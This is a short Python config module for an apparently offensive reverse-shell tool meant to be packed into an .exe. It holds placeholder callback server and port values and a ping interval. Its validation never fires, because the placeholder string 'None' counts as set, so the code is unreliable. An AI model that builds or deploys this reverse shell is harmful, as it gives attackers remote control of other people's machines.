"""
This module contains the config for the reverse shell.
"""

# NOTE: Before building the file make sure to point this to your server URL
#       we can't use os.getenv because it will be packed in a .exe and not ran standalone.
SERVER_URL = "None"
SERVER_PORT = "None"

# ping config
PING_INTERVAL = 180  # seconds
PING_MESSAGE = b">>ping<<"

# check if all the variables are populated
req_vars = [SERVER_URL, SERVER_PORT]
if not all(req_vars):
    raise ValueError("All required variables are not set. Please check the config.py file.")
